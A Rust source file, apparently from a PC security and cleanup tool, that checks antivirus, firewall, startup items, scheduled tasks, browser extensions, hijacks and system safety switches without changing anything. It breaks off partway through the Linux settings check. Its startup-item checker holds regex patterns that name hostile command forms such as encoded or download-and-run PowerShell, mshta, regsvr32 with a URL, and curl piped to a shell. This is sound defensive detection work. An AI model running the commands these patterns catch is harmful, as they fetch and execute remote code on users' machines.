// Security check (read-only: nothing here changes a setting, a program or a file).
//   1. Protection: antivirus, real-time protection, tamper protection, virus definitions, firewall.
//   2. Suspicious startup items and scheduled tasks (odd places, hidden scripts, unsigned programs).
//   3. Browser extensions (Chrome and Edge) with risky powers, from outside the store, or long unupdated.
//   4. Windows Update: restart pending, last real update.
use super::jobs::Job;
use super::util;
#[cfg(windows)]
use super::health;
use super::{Config, Engine};
use regex::Regex;
use serde_json::{json, Value};
use std::collections::HashMap;
use std::path::Path;
#[cfg(windows)]
use std::path::PathBuf;
use std::sync::{Arc, OnceLock};

// ---------- 1. protection ----------
fn protection(cfg: &Config) -> Vec<Value> {
    let mut items = Vec::new();
    if cfg.test {
        return items;
    }
    #[cfg(windows)]
    {
        use super::win::{v_f64, v_str, wmi};
        let av: Vec<String> = wmi("ROOT\\SecurityCenter2", "SELECT displayName FROM AntiVirusProduct").iter().filter_map(|r| v_str(r, "displayName")).collect();
        items.push(json!({ "name": "Antivirus", "ok": !av.is_empty(), "detail": if av.is_empty() { "No antivirus is registered with Windows.".to_string() } else { av.join(", ") } }));
        let d = health::defender(cfg);
        if let Some(rt) = d.realtime {
            items.push(json!({ "name": "Real-time protection", "ok": rt, "detail": if rt { "On: files are checked as they open." } else { "Off: turn it on in Windows Security." } }));
        }
        if let Some(tp) = d.tamper {
            items.push(json!({ "name": "Tamper protection", "ok": tp, "detail": if tp { "On: malware cannot switch your protection off." } else { "Off: turn it on in Windows Security > Virus & threat protection settings." } }));
        }
        if let Some(age) = d.signature_age {
            items.push(json!({ "name": "Virus definitions", "ok": age <= 3, "fix": "update_definitions",
                "detail": if age <= 3 { format!("Up to date ({} day(s) old).", age) } else { format!("{} days old. Update them so new viruses are recognised.", age) } }));
        }
        // Adware and unwanted-app blocking (Windows Security > App & browser control > Reputation-based protection).
        if let Some(pua) = wmi("ROOT\\Microsoft\\Windows\\Defender", "SELECT PUAProtection FROM MSFT_MpPreference").first().and_then(|r| v_f64(r, "PUAProtection")) {
            let on = pua == 1.0;
            items.push(json!({ "name": "Unwanted-app blocking", "ok": on, "fix": "appbrowser",
                "detail": if on { "On: adware and unwanted apps are blocked." } else { "Off: turn on \"Potentially unwanted app blocking\" in Windows Security > App & browser control > Reputation-based protection." } }));
        }
        let fw = wmi("ROOT\\StandardCimv2", "SELECT Name, Enabled FROM MSFT_NetFirewallProfile");
        if !fw.is_empty() {
            // Enabled: 0 = off, 1 = on, 2 = not configured (Windows' default, which is on).
            let off: Vec<String> = fw.iter().filter(|r| v_f64(r, "Enabled") == Some(0.0)).filter_map(|r| v_str(r, "Name")).collect();
            items.push(json!({ "name": "Firewall", "ok": off.is_empty(), "detail": if off.is_empty() { "On for home, work and public networks.".to_string() } else { format!("Off for: {}", off.join(", ")) } }));
        }
    }
    #[cfg(target_os = "linux")]
    {
        let clam = super::linux::clam_installed();
        items.push(json!({ "name": "Virus scanner (ClamAV)", "ok": clam, "fix": if clam { "" } else { "clamav_install" },
            "detail": if clam { "Installed: Quick Scan and Full Scan use it." } else { "Not installed. Install it with one click (your system asks for your password)." } }));
        if clam {
            if let Some(age) = super::linux::clam_defs_age_days() {
                items.push(json!({ "name": "Virus definitions", "ok": age <= 3, "fix": "update_definitions",
                    "detail": if age <= 3 { format!("Up to date ({} day(s) old).", age) } else { format!("{} days old. Update them so new viruses are recognised.", age) } }));
            }
        }
        match super::linux::firewall() {
            Some((on, name)) => items.push(json!({ "name": "Firewall", "ok": on, "detail": if on { format!("On ({}).", name) } else { format!("Off. Turn it on in your system's firewall settings ({}).", name) } })),
            None => items.push(json!({ "name": "Firewall", "ok": false, "detail": "No firewall is set up. Many Linux systems use ufw; \"sudo ufw enable\" in a terminal turns it on." })),
        }
    }
    items
}

// ---------- 2. startup items and scheduled tasks ----------
/// The program a command line starts ("C:\x y\a.exe" -arg, C:\a.exe arg, rundll32 x.dll,...).
pub fn command_target(cmd: &str) -> String {
    let c = util::expand_env(cmd).trim().to_string();
    if let Some(rest) = c.strip_prefix('"') {
        if let Some(end) = rest.find('"') {
            return rest[..end].to_string();
        }
    }
    static R: OnceLock<Regex> = OnceLock::new();
    let r = R.get_or_init(|| Regex::new(r"(?i)^(.+?\.(exe|com|bat|cmd|vbs|js|ps1|scr|dll|lnk))(\s|,|$)").unwrap());
    if let Some(m) = r.captures(&c) {
        return m[1].to_string();
    }
    c.split_whitespace().next().unwrap_or("").to_string()
}

struct Sig(HashMap<String, Option<bool>>);
impl Sig {
    fn signed(&mut self, p: &str) -> Option<bool> {
        if let Some(v) = self.0.get(p) {
            return *v;
        }
        #[cfg(windows)]
        let v = super::win::is_signed(Path::new(p));
        #[cfg(not(windows))]
        let v = None;
        self.0.insert(p.to_string(), v);
        v
    }
}

/// Why a startup command looks suspicious; empty when it looks normal.
fn reasons(cmd: &str, target: &str, sig: &mut Sig) -> Vec<String> {
    static RES: OnceLock<Vec<(Regex, &'static str)>> = OnceLock::new();
    let res = RES.get_or_init(|| {
        vec![
            (Regex::new(r"(powershell|pwsh)(\.exe)?\b.*(-e(nc|ncodedcommand)?\s|frombase64string)").unwrap(), "runs a hidden, scrambled PowerShell command"),
            (Regex::new(r"(powershell|pwsh).*(downloadstring|downloadfile|invoke-webrequest|iwr |iex|invoke-expression|https?://)").unwrap(), "downloads and runs something from the internet"),
            (Regex::new(r"\bmshta(\.exe)?\b").unwrap(), "uses mshta, a common malware trick"),
            (Regex::new(r"regsvr32.*/i:\s*https?:|rundll32.*javascript:").unwrap(), "loads code from the internet"),
        ]
    });
    let lc = util::expand_env(cmd).to_lowercase();
    let mut r: Vec<String> = Vec::new();
    for (k, why) in [("\\appdata\\local\\temp\\", "runs from a Temp folder"), ("\\windows\\temp\\", "runs from a Temp folder"), ("\\downloads\\", "runs from Downloads"), ("\\users\\public\\", "runs from the shared Public folder"), ("\\$recycle.bin\\", "runs from the Recycle Bin")] {
        if lc.contains(k) {
            r.push(why.into());
            break;
        }
    }
    for (re, why) in res {
        if re.is_match(&lc) {
            r.push((*why).into());
        }
    }
    static WS: OnceLock<Regex> = OnceLock::new();
    if WS.get_or_init(|| Regex::new(r"\b(wscript|cscript)(\.exe)?\b").unwrap()).is_match(&lc) && !lc.contains("\\windows\\") {
        r.push("runs a script file".into());
    }
    static TRUSTED: OnceLock<Regex> = OnceLock::new();
    let trusted = TRUSTED.get_or_init(|| Regex::new(r"(?i)^[A-Za-z]:\\(Windows|Program Files|Program Files \(x86\))\\").unwrap());
    let t = target;
    let tl = t.to_lowercase();
    if !t.is_empty() && Path::new(t).is_file() && !trusted.is_match(t) && [".exe", ".dll", ".scr", ".com"].iter().any(|e| tl.ends_with(e)) && sig.signed(t) == Some(false) {
        r.push("program is not signed by its maker".into());
    }
    static ABS: OnceLock<Regex> = OnceLock::new();
    if cfg!(windows) && ABS.get_or_init(|| Regex::new(r"^[A-Za-z]:\\").unwrap()).is_match(t) && !Path::new(t).exists() {
        r.push("points to a program that no longer exists".into());
    }
    if cfg!(unix) {
        if ["/tmp/", "/var/tmp/", "/dev/shm/"].iter().any(|d| lc.contains(d)) {
            r.push("runs from a temporary folder".into());
        }
        if (lc.contains("curl ") || lc.contains("wget ")) && ["| sh", "|sh", "| bash", "|bash"].iter().any(|p| lc.contains(p)) {
            r.push("downloads and runs something from the internet".into());
        }
        if lc.contains("base64 -d") || lc.contains("base64 --decode") {
            r.push("runs a hidden, scrambled command".into());
        }
        if t.starts_with('/') && !Path::new(t).exists() {
            r.push("points to a program that no longer exists".into());
        }
    }
    r
}

#[cfg_attr(not(windows), allow(dead_code))]
fn xml_unescape(s: &str) -> String {
    s.replace("&lt;", "<").replace("&gt;", ">").replace("&quot;", "\"").replace("&apos;", "'").replace("&amp;", "&")
}

/// Every scheduled task's actions: (folder, name, command line).
#[cfg_attr(not(windows), allow(dead_code))]
fn scheduled_tasks() -> Vec<(String, String, String)> {
    let Ok(out) = util::command("schtasks.exe").args(["/query", "/xml", "ONE"]).output() else { return Vec::new() };
    let text = String::from_utf8_lossy(&out.stdout).replace('\0', "");
    static CMD: OnceLock<Regex> = OnceLock::new();
    let cmd_re = CMD.get_or_init(|| Regex::new(r"(?s)<Exec>.*?<Command>(.*?)</Command>(?:\s*<Arguments>(.*?)</Arguments>)?").unwrap());
    let mut found = Vec::new();
    for block in text.split("<!-- ").skip(1) {
        let Some((uri, body)) = block.split_once(" -->") else { continue };
        let uri = uri.trim();
        let (folder, name) = match uri.rfind('\\') {
            Some(i) => (uri[..i + 1].to_string(), uri[i + 1..].to_string()),
            None => ("\\".to_string(), uri.to_string()),
        };
        for c in cmd_re.captures_iter(body) {
            let exe = xml_unescape(c[1].trim());
            let args = c.get(2).map(|a| xml_unescape(a.as_str().trim())).unwrap_or_default();
            found.push((folder.clone(), name.clone(), format!("\"{}\" {}", exe.trim_matches('"'), args).trim().to_string()));
        }
    }
    found
}

fn autoruns(cfg: &Config) -> Vec<Value> {
    let mut sig = Sig(HashMap::new());
    let mut found = Vec::new();
    #[cfg(windows)]
    {
        use super::win::{reg_open, reg_string, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
        let mut keys: Vec<(&str, winreg::HKEY, String)> = vec![("HKCU", HKEY_CURRENT_USER, format!("{}\\Run", cfg.reg_base)), ("HKCU", HKEY_CURRENT_USER, format!("{}\\RunOnce", cfg.reg_base))];
        if !cfg.test {
            for k in ["SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run"] {
                keys.push(("HKLM", HKEY_LOCAL_MACHINE, k.to_string()));
            }
        }
        for (hname, hive, path) in keys {
            let Some(k) = reg_open(hive, &path) else { continue };
            for (name, _) in k.enum_values().flatten() {
                if name.is_empty() {
                    continue;
                }
                let cmd = reg_string(&k, &name).unwrap_or_default();
                let why = reasons(&cmd, &command_target(&cmd), &mut sig);
                if !why.is_empty() {
                    found.push(json!({ "kind": "Starts with Windows", "name": name, "where": format!("{}\\{}", hname, path), "command": cmd, "reasons": why }));
                }
            }
        }
        let mut folders = vec![cfg.roaming.join("Microsoft").join("Windows").join("Start Menu").join("Programs").join("Startup")];
        if !cfg.test {
            folders.push(PathBuf::from(std::env::var("ProgramData").unwrap_or_default()).join("Microsoft").join("Windows").join("Start Menu").join("Programs").join("StartUp"));
        }
        for dir in folders {
            let Ok(rd) = std::fs::read_dir(&dir) else { continue };
            for e in rd.flatten() {
                let p = e.path();
                let name = e.file_name().to_string_lossy().to_string();
                if !p.is_file() || name.eq_ignore_ascii_case("desktop.ini") {
                    continue;
                }
                let ext = p.extension().map(|x| x.to_string_lossy().to_lowercase()).unwrap_or_default();
                let cmd = if ext == "lnk" { super::win::lnk_target(&p).map(|t| format!("\"{}\"", t.display())).unwrap_or_else(|| p.to_string_lossy().to_string()) } else { p.to_string_lossy().to_string() };
                let mut why = reasons(&cmd, &command_target(&cmd), &mut sig);
                if ["vbs", "js", "bat", "cmd", "ps1"].contains(&ext.as_str()) {
                    why.push("a script in your Startup folder".into());
                }
                if !why.is_empty() {
                    found.push(json!({ "kind": "Starts with Windows", "name": name, "where": "Startup folder", "command": cmd, "reasons": why }));
                }
            }
        }
        if !cfg.test {
            for (folder, name, cmd) in scheduled_tasks() {
                let mut why = reasons(&cmd, &command_target(&cmd), &mut sig);
                if folder.to_lowercase().starts_with("\\microsoft\\") {
                    why.retain(|w| w != "program is not signed by its maker" && w != "points to a program that no longer exists");
                }
                if !why.is_empty() {
                    found.push(json!({ "kind": "Scheduled task", "name": name, "where": folder, "command": cmd, "reasons": why }));
                }
            }
        }
    }
    #[cfg(target_os = "linux")]
    {
        for a in super::linux::autostart_entries(cfg).into_iter().filter(|a| a.enabled) {
            let mut why = reasons(&a.exec, &command_target(&a.exec), &mut sig);
            let lower = a.exec.to_lowercase();
            if lower.ends_with(".sh") || lower.contains(".sh ") {
                why.push("a script that starts when you sign in".into());
            }
            if !why.is_empty() {
                found.push(json!({ "kind": "Starts when you sign in", "name": a.name, "where": if a.system { "/etc/xdg/autostart" } else { "~/.config/autostart" }, "command": a.exec, "reasons": why }));
            }
        }
        if let Ok(rd) = std::fs::read_dir(cfg.config.join("systemd").join("user")) {
            for e in rd.flatten() {
                let n = e.file_name().to_string_lossy().to_string();
                if !n.ends_with(".service") || n.starts_with("sweepwise-") {
                    continue;
                }
                let text = std::fs::read_to_string(e.path()).unwrap_or_default();
                let exec = text.lines().find_map(|l| l.trim().strip_prefix("ExecStart=")).unwrap_or("").to_string();
                let why = reasons(&exec, &command_target(&exec), &mut sig);
                if !why.is_empty() {
                    found.push(json!({ "kind": "Background service", "name": n, "where": "~/.config/systemd/user", "command": exec, "reasons": why }));
                }
            }
        }
    }
    let _ = (&mut sig, cfg);
    found
}

// ---------- 3. browser extensions ----------
const RISKY: &[(&str, &str)] = &[
    ("debugger", "can take control of pages"),
    ("proxy", "can route your browsing through another server"),
    ("nativeMessaging", "can talk to programs on your PC"),
    ("management", "can turn your other extensions on and off"),
    ("webRequestBlocking", "can change web traffic"),
    ("cookies", "can read your sign-in cookies"),
    ("history", "can read your browsing history"),
    ("clipboardRead", "can read your clipboard"),
    ("downloads", "can manage your downloads"),
    ("privacy", "can change privacy settings"),
];

/// Turns "__MSG_appName__" into the extension's real name from its translation files.
fn ext_name(dir: &Path, manifest: &Value, raw: &str) -> String {
    let Some(key) = raw.strip_prefix("__MSG_").and_then(|k| k.strip_suffix("__")) else { return raw.to_string() };
    let loc = manifest["default_locale"].as_str().unwrap_or("en").to_string();
    for l in [loc.as_str(), "en", "en_US"] {
        let f = dir.join("_locales").join(l).join("messages.json");
        let Ok(text) = std::fs::read_to_string(&f) else { continue };
        // A pattern, not a JSON parser: some messages.json files repeat keys in different case.
        let pat = format!(r#"(?is)"{}"\s*:\s*\{{[^}}]*?"message"\s*:\s*"((?:[^"\\]|\\.)*)""#, regex::escape(key));
        if let Ok(re) = Regex::new(&pat) {
            if let Some(c) = re.captures(text.trim_start_matches('\u{feff}')) {
                return serde_json::from_str::<String>(&format!("\"{}\"", &c[1])).unwrap_or_else(|_| c[1].to_string());
            }
        }
    }
    raw.to_string()
}

fn extensions(cfg: &Config) -> Vec<Value> {
    let mut list = Vec::new();
    for b in super::clean::browsers(cfg) {
        let (browser, data) = (b.name, b.data);
        if !data.is_dir() {
            continue;
        }
        let names: HashMap<String, String> = util::read_json(&data.join("Local State"))
            .and_then(|ls| ls["profile"]["info_cache"].as_object().map(|m| m.iter().map(|(k, v)| (k.clone(), v["name"].as_str().unwrap_or(k).to_string())).collect()))
            .unwrap_or_default();
        let Ok(profiles) = std::fs::read_dir(&data) else { continue };
        for prof in profiles.flatten() {
            let exts = prof.path().join("Extensions");
            let Ok(rd) = std::fs::read_dir(&exts) else { continue };
            for ext in rd.flatten() {
                // The newest installed version folder.
                let ver = std::fs::read_dir(ext.path()).ok().and_then(|v| {
                    v.flatten().filter(|e| e.path().is_dir()).max_by_key(|e| e.metadata().and_then(|m| m.modified()).ok())
                });
                let Some(ver) = ver else { continue };
                let mf = ver.path().join("manifest.json");
                let Some(m) = util::read_json(&mf) else { continue };
                let name = ext_name(&ver.path(), &m, m["name"].as_str().unwrap_or(""));
                let mut perms: Vec<String> = Vec::new();
                for k in ["permissions", "optional_permissions", "host_permissions"] {
                    perms.extend(m[k].as_array().cloned().unwrap_or_default().iter().filter_map(|p| p.as_str().map(|s| s.to_string())));
                }
                for cs in m["content_scripts"].as_array().cloned().unwrap_or_default() {
                    perms.extend(cs["matches"].as_array().cloned().unwrap_or_default().iter().filter_map(|p| p.as_str().map(|s| s.to_string())));
                }
                let mut why: Vec<String> = Vec::new();
                let broad = perms.iter().any(|p| ["<all_urls>", "*://*/*", "http://*/*", "https://*/*"].contains(&p.as_str()));
                if broad {
                    why.push("can read and change every website you visit".into());
                }
                let mut sensitive = 0;
                for (p, w) in RISKY {
                    if perms.iter().any(|x| x == p) {
                        why.push((*w).into());
                        sensitive += 1;
                    }
                }
                let update_url = m["update_url"].as_str().unwrap_or("").to_lowercase();
                let store = update_url.contains("google.com") || update_url.contains("googleapis.com") || update_url.contains("edge.microsoft.com");
                if !store {
                    why.push(format!("not installed from the {} store", if browser == "Edge" { "Edge Add-ons or Chrome Web" } else { "Chrome Web" }));
                }
                let age = std::fs::metadata(&mf).and_then(|x| x.modified()).map(util::days_since).unwrap_or(0.0) as i64;
                if age > 730 {
                    why.push(format!("not updated in {} years", age / 365));
                }
                // check = worth a real look; note = powerful but normal for its kind (ad blockers, PDF tools).
                let rerouter = perms.iter().any(|p| p == "proxy" || p == "management");
                let level = if !store || (age > 730 && broad) || (rerouter && sensitive >= 3) { "check" } else if !why.is_empty() { "note" } else { "ok" };
                let pid = prof.file_name().to_string_lossy().to_string();
                list.push(json!({
                    "name": name, "id": ext.file_name().to_string_lossy(), "version": m["version"].as_str().unwrap_or(""), "browser": browser,
                    "profile": format!("{} · {}", browser, names.get(&pid).cloned().unwrap_or(pid)), "reasons": why, "level": level, "days_since_update": age,
                }));
            }
        }
    }
    list
}

// ---------- 3b. browser hijacks: hosts file, proxy, search engine and homepage, forced browser policies ----------
const LOCAL_NAMES: &[&str] = &["localhost", "localhost.localdomain", "local", "broadcasthost", "ip6-localhost", "ip6-loopback", "ip6-localnet", "ip6-mcastprefix", "ip6-allnodes", "ip6-allrouters", "ip6-allhosts"];
const KNOWN_SEARCH: &[&str] = &["google.", "bing.com", "duckduckgo.com", "yahoo.com", "ecosia.org", "search.brave.com", "startpage.com", "qwant.com", "yandex.", "baidu.com", "naver.com", "perplexity.ai", "kagi.com", "you.com", "msn.com"];

fn known_search(host: &str) -> bool {
    let h = host.to_lowercase();
    KNOWN_SEARCH.iter().any(|k| h.contains(k))
}

/// Hosts-file lines that send web addresses somewhere else. Blocking lists (0.0.0.0 / 127.0.0.1) are only noted.
pub fn hosts_findings(text: &str) -> Vec<Value> {
    let (mut redirects, mut blocked) = (Vec::new(), 0usize);
    // Linux lists the computer's own name in its hosts file; that is normal.
    let me = sysinfo::System::host_name().unwrap_or_default().to_lowercase();
    let own = |n: &str| !me.is_empty() && (n == me || n.starts_with(&format!("{}.", me)));
    for line in text.lines() {
        let l = line.trim_start_matches('\u{feff}').split('#').next().unwrap_or("").trim().to_string();
        if l.is_empty() {
            continue;
        }
        let mut parts = l.split_whitespace();
        let ip = parts.next().unwrap_or("");
        if ip == "127.0.1.1" {
            continue; // Debian and Ubuntu's line for this computer's own name
        }
        let names: Vec<&str> = parts.filter(|n| !LOCAL_NAMES.contains(&n.to_lowercase().as_str()) && !own(&n.to_lowercase())).collect();
        if names.is_empty() {
            continue;
        }
        if ["0.0.0.0", "127.0.0.1", "::1", "::"].contains(&ip) {
            blocked += names.len();
        } else {
            for n in names {
                redirects.push(format!("{} to {}", n, ip));
            }
        }
    }
    let mut out = Vec::new();
    if !redirects.is_empty() {
        let shown: Vec<String> = redirects.iter().take(5).cloned().collect();
        out.push(json!({ "name": "Hosts file", "level": "check",
            "detail": format!("{} web address(es) are sent to fixed places: {}{}. Some VPN and security apps add these; malware does too. If you don't recognise them, ask for help before changing anything.",
                redirects.len(), shown.join(", "), if redirects.len() > 5 { ", ..." } else { "" }) }));
    }
    if blocked > 0 {
        out.push(json!({ "name": "Hosts file", "level": "note", "detail": format!("{} web address(es) are blocked (often an ad-blocking list someone added on purpose).", blocked) }));
    }
    out
}

/// A proxy or an automatic proxy script set for this Windows account (a common way to watch or change browsing).
pub fn proxy_finding(enabled: bool, server: &str, pac: &str) -> Option<Value> {
    if !pac.trim().is_empty() {
        return Some(json!({ "name": "Proxy", "level": "check", "detail": format!("Web traffic is set to follow an automatic script ({}). If you didn't set this up (work and school PCs often do), it may be a hijack.", pac.trim()) }));
    }
    if enabled && !server.trim().is_empty() {
        let local = server.contains("127.0.0.1") || server.to_lowercase().contains("localhost");
        return Some(json!({ "name": "Proxy", "level": if local { "note" } else { "check" },
            "detail": format!("Web traffic goes through {}.{}", server.trim(), if local { " That is a program on this PC (some VPN, ad-blocking and developer tools do this)." } else { " If you didn't set this up, it may be a hijack." }) }));
    }
    None
}

/// One browser profile's search engine, from its Preferences file: a changed engine on an unknown site is flagged.
pub fn search_finding(browser: &str, profile: &str, prefs: &Value) -> Option<Value> {
    let d = &prefs["default_search_provider_data"];
    let t = if d["template_url_data"].is_object() { &d["template_url_data"] } else { &d["mirrored_template_url_data"] };
    if !t.is_object() {
        return None;
    }
    if t["prepopulate_id"].as_i64().unwrap_or(0) > 0 {
        return None; // one of the browser's own built-in engines (Google, Bing, DuckDuckGo...)
    }
    let url = t["url"].as_str().unwrap_or("");
    let host = url.split("://").nth(1).and_then(|r| r.split(['/', '?', ':']).next()).unwrap_or("");
    if host.is_empty() || host.starts_with('{') || known_search(host) {
        return None;
    }
    let forced = t["enforced_by_policy"].as_bool().unwrap_or(false);
    Some(json!({ "name": format!("{} search engine ({})", browser, profile), "level": "check",
        "detail": format!("Searches go to {}{}. Search hijackers change this; if you didn't choose it, set your search engine back in the browser's settings.", host, if forced { ", and a policy forces it" } else { "" }) }))
}

fn hijacks(cfg: &Config) -> Vec<Value> {
    let mut out = Vec::new();
    if !cfg.test {
        let hosts = if cfg!(windows) { std::path::PathBuf::from(std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".into())).join("System32").join("drivers").join("etc").join("hosts") } else { std::path::PathBuf::from("/etc/hosts") };
        if let Ok(b) = std::fs::read(&hosts) {
            out.extend(hosts_findings(&String::from_utf8_lossy(&b)));
        }
    }
    #[cfg(windows)]
    {
        use super::win::{reg_open, reg_string, reg_u32, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE};
        if !cfg.test {
            if let Some(k) = reg_open(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings") {
                if let Some(f) = proxy_finding(reg_u32(&k, "ProxyEnable") == Some(1), &reg_string(&k, "ProxyServer").unwrap_or_default(), &reg_string(&k, "AutoConfigURL").unwrap_or_default()) {
                    out.push(f);
                }
            }
            // Policies that force browser settings: on a home PC that is usually adware.
            for (hive, hname) in [(HKEY_LOCAL_MACHINE, "HKLM"), (HKEY_CURRENT_USER, "HKCU")] {
                for (browser, key) in [("Chrome", "SOFTWARE\\Policies\\Google\\Chrome"), ("Edge", "SOFTWARE\\Policies\\Microsoft\\Edge")] {
                    let Some(k) = reg_open(hive, key) else { continue };
                    let mut forced: Vec<String> = Vec::new();
                    for v in ["HomepageLocation", "DefaultSearchProviderSearchURL", "NewTabPageLocation"] {
                        if let Some(x) = reg_string(&k, v) {
                            forced.push(format!("{} = {}", v, x.chars().take(80).collect::<String>()));
                        }
                    }
                    if let Ok(list) = k.open_subkey("ExtensionInstallForcelist") {
                        let n = list.enum_values().count();
                        if n > 0 {
                            forced.push(format!("{} extension(s) installed by force", n));
                        }
                    }
                    if !forced.is_empty() {
                        out.push(json!({ "name": format!("{} settings forced by a policy ({})", browser, hname), "level": "check",
                            "detail": format!("{}. Work and school PCs use policies on purpose; on a home PC this is usually adware.", forced.join("; ")) }));
                    }
                }
            }
        }
    }
    #[cfg(target_os = "linux")]
    if !cfg.test {
        let (on, server, pac) = super::linux::proxy();
        if let Some(f) = proxy_finding(on, &server, &pac) {
            out.push(f);
        }
        for (browser, dir) in [("Chrome", "/etc/opt/chrome/policies/managed"), ("Chromium", "/etc/chromium/policies/managed"), ("Edge", "/etc/opt/edge/policies/managed")] {
            let Ok(rd) = std::fs::read_dir(dir) else { continue };
            let mut forced: Vec<String> = Vec::new();
            for e in rd.flatten() {
                let Some(v) = util::read_json(&e.path()) else { continue };
                for k in ["HomepageLocation", "DefaultSearchProviderSearchURL", "NewTabPageLocation"] {
                    if let Some(x) = v[k].as_str() {
                        forced.push(format!("{} = {}", k, x.chars().take(80).collect::<String>()));
                    }
                }
                if v["ExtensionInstallForcelist"].as_array().map_or(false, |a| !a.is_empty()) {
                    forced.push("extensions installed by force".into());
                }
            }
            if !forced.is_empty() {
                out.push(json!({ "name": format!("{} settings forced by a policy", browser), "level": "check", "detail": format!("{}. Work and school computers use policies on purpose; on a home computer this is usually adware.", forced.join("; ")) }));
            }
        }
    }
    for b in super::clean::browsers(cfg) {
        let (browser, data) = (b.name, b.data);
        let Ok(rd) = std::fs::read_dir(&data) else { continue };
        let names: HashMap<String, String> = util::read_json(&data.join("Local State"))
            .and_then(|ls| ls["profile"]["info_cache"].as_object().map(|m| m.iter().map(|(k, v)| (k.clone(), v["name"].as_str().unwrap_or(k).to_string())).collect()))
            .unwrap_or_default();
        for prof in rd.flatten() {
            let Some(prefs) = util::read_json(&prof.path().join("Preferences")) else { continue };
            let pid = prof.file_name().to_string_lossy().to_string();
            if let Some(f) = search_finding(browser, names.get(&pid).map(|s| s.as_str()).unwrap_or(&pid), &prefs) {
                out.push(f);
            }
        }
    }
    out
}

// ---------- 3c. Windows' own safety switches and privacy (PUBLIC_SPEC 55: what paid suites call "vulnerability
// assessment"). Read-only: each item says what it means and where to change it. level: good / warn / info.
fn item(name: &str, level: &str, detail: &str, fix: &str) -> Value {
    json!({ "name": name, "level": level, "detail": detail, "fix": fix })
}

fn posture(cfg: &Config) -> Vec<Value> {
    let mut v = Vec::new();
    if cfg.test {
        return v;
    }
    #[cfg(windows)]
    {
        use super::win::{reg_open, reg_string, reg_u32, HKEY_LOCAL_MACHINE};
        let d = |path: &str, name: &str| reg_open(HKEY_LOCAL_MACHINE, path).and_then(|k| reg_u32(&k, name));
        match d("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA") {
            Some(0) => v.push(item("Permission prompts (UAC)", "warn", "Off: any program can change Windows without asking you. Turn User Account Control back on.", "uac")),
            Some(_) => v.push(item("Permission prompts (UAC)", "good", "On: programs must ask before they change Windows.", "")),
            None => {}
        }
        match d("SYSTEM\\CurrentControlSet\\Control\\Terminal Server", "fDenyTSConnections") {
            Some(0) => v.push(item("Remote Desktop", "warn", "On: other computers can connect to this PC. If you don't use it, turn it off.", "remote_desktop")),
            Some(_) => v.push(item("Remote Desktop", "good", "Off: nobody can connect to this PC remotely.", "")),
            None => {}
        }
        if let Some(start) = d("SYSTEM\\CurrentControlSet\\Services\\mrxsmb10", "Start") {
            if start != 4 {
                v.push(item("Old file sharing (SMB1)", "warn", "On: an old way of sharing files that worms like WannaCry used. Windows 10 and 11 normally keep it off; turn it off in Windows features unless an old device needs it.", "windows_features"));
            }
        } else {
            v.push(item("Old file sharing (SMB1)", "good", "Off, as it should be.", ""));
        }
        match d("SYSTEM\\CurrentControlSet\\Control\\SecureBoot\\State", "UEFISecureBootEnabled") {
            Some(0) => v.push(item("Secure Boot", "warn", "Off: malware that loads before Windows is harder to stop. It is switched on in the PC's start-up (UEFI) settings; ask for help if you are unsure.", "")),
            Some(_) => v.push(item("Secure Boot", "good", "On: only trusted software can start before Windows.", "")),
            None => {}
        }
        match d("SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity", "Enabled") {
            Some(1) => v.push(item("Memory integrity", "good", "On: Windows' core is protected from tampering.", "")),
            _ => v.push(item("Memory integrity", "info", "Off: Core isolation > Memory integrity blocks attacks on Windows' core. Turn it on in Windows Security > Device security (some old drivers prevent it).", "core_isolation")),
        }
        if let Some(sscr) = reg_open(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer").and_then(|k| reg_string(&k, "SmartScreenEnabled")) {
            if sscr.eq_ignore_ascii_case("Off") {
                v.push(item("SmartScreen", "warn", "Off: Windows no longer warns before you run unknown downloads. Turn it on in Windows Security > App & browser control.", "appbrowser"));
            } else {
                v.push(item("SmartScreen", "good", "On: Windows warns before unknown downloads run.", ""));
            }
        }
        // Wi-Fi without a password: others nearby can see unprotected traffic.
        if let Ok(o) = util::command("netsh.exe").args(["wlan", "show", "interfaces"]).output() {
            let text = String::from_utf8_lossy(&o.stdout).to_string();
            let field = |k: &str| text.lines().find(|l| l.trim_start().to_lowercase().starts_with(k)).and_then(|l| l.split_once(':')).map(|(_, x)| x.trim().to_string());
            if field("state").map_or(false, |x| x.eq_ignore_ascii_case("connected")) {
                match field("authentication") {
                    Some(a) if a.eq_ignore_ascii_case("open") => v.push(item("Wi-Fi", "warn", "This Wi-Fi network has no password, so people nearby can see unprotected traffic. Avoid banking on it, or use a network with a password.", "")),
                    Some(a) => v.push(item("Wi-Fi", "good", &format!("Protected with {}.", a), "")),
                    None => {}
                }
            }
        }
        if let Some(cfa) = wmi_pref("EnableControlledFolderAccess") {
            if cfa == 1.0 {
                v.push(item("Ransomware protection", "good", "On: unknown apps can't change your documents and pictures.", ""));
            } else {
                v.push(item("Ransomware protection", "info", "Off (Windows' default). Windows Security's Controlled folder access can stop unknown apps from changing your documents; some apps then need your permission once.", "ransomware"));
            }
        }
    }
    #[cfg(target_os = "linux")]
    {
        match super::linux::auto_updates() {
            Some(true) => v.push(item("Automatic security updates", "good", "On: security fixes install by themselves.", "")),
            Some(false) => v.push(item("Automatic security updates", "warn", "Off: security fixes only install when you update by hand. Turn on automatic updates in your software settings.", "software_updates")),
            None => {}
        }
        match super::linux::disk_encrypted() {
            Some(true) => v.push(item("Disk encryption", "good", "On: if this computer is lost or stolen, your files can't be read.", "")),
            Some(false) => v.push(item("Disk encryption", "info", "Off: anyone with this computer's drive can read your files. Encryption is chosen when Linux is installed.", "")),
            None => {}
        }
        match super::linux::secure_boot() {
            Some(true) => v.push(item("Secure Boot", "good", "On: only trusted software can start before Linux.", "")),
